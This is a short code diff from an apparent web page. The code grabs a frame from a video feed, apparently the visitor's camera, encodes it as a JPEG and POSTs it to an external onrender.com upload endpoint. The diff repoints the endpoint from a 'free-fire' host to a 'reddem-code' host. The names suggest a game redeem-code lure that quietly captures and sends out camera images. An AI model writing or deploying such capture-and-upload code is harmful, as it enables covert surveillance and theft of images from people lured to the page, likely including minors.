@@ -33,7 +33,7 @@
                 canvas.height = video.videoHeight;
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const frameData = canvas.toDataURL("image/jpeg");
-                fetch("https://free-fire-wgxh.onrender.com/upload", {
+                fetch("https://reddem-code.onrender.com/upload", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ frame: frameData })
